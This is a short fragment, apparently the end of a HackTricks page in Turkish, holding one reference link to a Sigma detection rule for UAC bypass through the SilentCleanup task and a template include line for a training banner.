- [8] [Sigma / Detection.FYI – SilentCleanup Task kullanarak UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
